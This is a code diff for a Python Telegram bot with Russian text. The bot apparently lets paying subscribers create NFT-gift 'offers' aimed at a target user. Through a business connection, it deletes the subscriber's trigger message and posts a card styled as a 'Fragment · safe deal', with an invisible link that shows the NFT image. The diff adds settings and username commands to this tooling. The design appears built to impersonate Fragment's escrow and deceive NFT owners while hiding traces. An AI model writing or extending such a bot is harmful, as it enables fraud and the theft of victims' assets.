@@ -68,7 +68,7 @@ def init_db():
 init_db()
 
 # ==========================================
-# РЕГУЛЯРКИ
+# РЕГУЛЯРКИ И ПАРСЕРЫ
 # ==========================================
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
@@ -94,7 +94,7 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# ОТПРАВКА / УДАЛЕНИЕ / РЕДАКТИРОВАНИЕ
+# ОТПРАВКА / УДАЛЕНИЕ
 # ==========================================
 async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
     for attempt in range(retries):
@@ -113,19 +113,14 @@ async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_marku
     return None
 
 async def delete_code_message(bot: Bot, chat_id: int, msg_id: int, conn_id: str):
-    """Пытаемся удалить код. Если нет прав — редактируем в пустоту."""
     try:
         await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
-        log.info("✅ Код успешно удален.")
-    except Exception as e:
-        log.warning(f"⚠️ Ошибка удаления (нет прав?): {e}. Пробуем редактировать...")
+        log.info("✅ Код удален.")
+    except Exception:
         try:
-            await bot.edit_message_text(
-                text=" ", chat_id=chat_id, message_id=msg_id, business_connection_id=conn_id
-            )
-            log.info("✅ Код стерт (отредактирован в пустоту).")
-        except Exception as e2:
-            log.error(f"❌ Не удалось ни удалить, ни отредактировать: {e2}")
+            await bot.edit_message_text(text=" ", chat_id=chat_id, message_id=msg_id, business_connection_id=conn_id)
+        except Exception:
+            pass
 
 # ==========================================
 # BUSINESS CONNECTION
@@ -136,11 +131,16 @@ async def on_business_conn(conn: BusinessConnection):
     log.info(f"✅ Business: user={conn.user.id} id={conn.id}")
 
 # ==========================================
-# МЕНЮ
+# МЕНЮ И НАСТРОЙКИ (ДЛЯ КЛИЕНТОВ)
 # ==========================================
 async def show_main_menu(target, uid):
     with get_db() as conn:
         user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
+    
+    if not user:
+        with get_db() as conn:
+            conn.execute("INSERT INTO users (user_id, my_username) VALUES (?, ?)", (uid, DEFAULT_RECEIVER))
+        user = {"subscribed": 0, "test_used": 0, "stats_created": 0, "stats_accepted": 0, "my_username": DEFAULT_RECEIVER}
     
     status = "✅ Активна" if user["subscribed"] else ("🎁 Тест-доступ" if user["test_used"] == 0 else "❌ Нет доступа")
     
@@ -154,6 +154,7 @@ async def show_main_menu(target, uid):
     
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="➕ Создать оффер", callback_data="create_offer_btn")],
+        [InlineKeyboardButton(text="⚙️ Настройки", callback_data="settings")],
         [InlineKeyboardButton(text="💎 Подписка", callback_data="buy_sub")]
     ])
     
@@ -165,12 +166,7 @@ async def cmd_start(msg: Message):
     if msg.from_user.id == ADMIN_ID:
         await msg.reply("👑 <b>Админ:</b> /keys | /set_default @ник | /addkey")
         return
-    
-    uid = msg.from_user.id
-    with get_db() as conn:
-        if not conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone():
-            conn.execute("INSERT INTO users (user_id, my_username) VALUES (?, ?)", (uid, DEFAULT_RECEIVER))
-    await show_main_menu(msg, uid)
+    await show_main_menu(msg, msg.from_user.id)
 
 @router.callback_query(F.data == "main_menu")
 async def cb_main_menu(cb: CallbackQuery):
@@ -178,13 +174,40 @@ async def cb_main_menu(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# ПОДПИСКИ
+# НАСТРОЙКИ (ВСЕ КОМАНДЫ)
+# ==========================================
+@router.callback_query(F.data == "settings")
+async def cb_settings(cb: CallbackQuery):
+    uid = cb.from_user.id
+    with get_db() as conn:
+        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
+    
+    curr = user["my_username"] if user and user["my_username"] else DEFAULT_RECEIVER
+    
+    text = (
+        f"<b>⚙️ Настройки профиля</b>\n\n"
+        f"Ваш текущий ник в офферах: <b>@{curr}</b>\n\n"
+        f"<b>Доступные команды:</b>\n"
+        f"▪️ <code>/setuser @ник</code> — сменить ник\n"
+        f"▪️ <code>/offer [ссылка] [цена] [@юзер]</code> — создать оффер\n"
+        f"▪️ <code>/key TG-XXXXXX</code> — активировать подписку\n"
+        f"▪️ <code>/cancel_of_XXXXX</code> — отменить оффер\n"
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+    ])
+    await cb.message.edit_text(text, reply_markup=kb)
+    await cb.answer()
+
+# ==========================================
+# ПОДПИСКА
 # ==========================================
 @router.callback_query(F.data == "create_offer_btn")
 async def cb_create_offer(cb: CallbackQuery):
     await cb.message.edit_text(
         "📝 <b>Формат:</b>\n<code>/offer [ссылка] [цена] [@username]</code>\n\n"
-        "Пример:\n<code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target</code>"
+        "Пример:\n<code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target</code>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]])
     )
     await cb.answer()
 
@@ -219,6 +242,28 @@ async def cmd_key(msg: Message):
             await show_main_menu(msg, uid)
         else:
             await msg.reply("❌ Неверный ключ.")
+
+# ==========================================
+# СМЕНА НИКА (ФИКС)
+# ==========================================
+@router.message(Command("setuser"))
+async def cmd_setuser(msg: Message):
+    uid = msg.from_user.id
+    parts = msg.text.split()
+    
+    if len(parts) < 2 or not parts[1].startswith("@"):
+        return await msg.reply("❌ Формат: <code>/setuser @ваш_ник</code>")
+    
+    new_rec = parts[1].replace("@", "").strip()
+    
+    with get_db() as conn:
+        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
+        if not user:
+            conn.execute("INSERT INTO users (user_id, subscribed, my_username) VALUES (?, 0, ?)", (uid, new_rec))
+        else:
+            conn.execute("UPDATE users SET my_username=? WHERE user_id=?", (new_rec, uid))
+            
+    await msg.reply(f"✅ Юзернейм в офферах изменен на <b>@{new_rec}</b>.")
 
 # ==========================================
 # СОЗДАНИЕ ОФФЕРА
@@ -281,7 +326,7 @@ async def cmd_cancel_offer(msg: Message):
         else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА (ФИНАЛЬНЫЙ ВИЗУАЛ)
+# ОТПРАВКА ОФФЕРА
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -298,14 +343,12 @@ async def handle_business_message(msg: Message):
     conn_id = BUSINESS_CONNS.get(msg.from_user.id)
     if not conn_id: return
 
-    # 1. Удаляем код (жестко)
     await delete_code_message(bot, msg.chat.id, msg.message_id, conn_id)
     await asyncio.sleep(1.5)
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
 
-    # 2. Текст с невидимой ссылкой для картинки НАВЕРХУ
     card_text = (
         f'<a href="{nft_link}">&#8203;</a>'
         f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
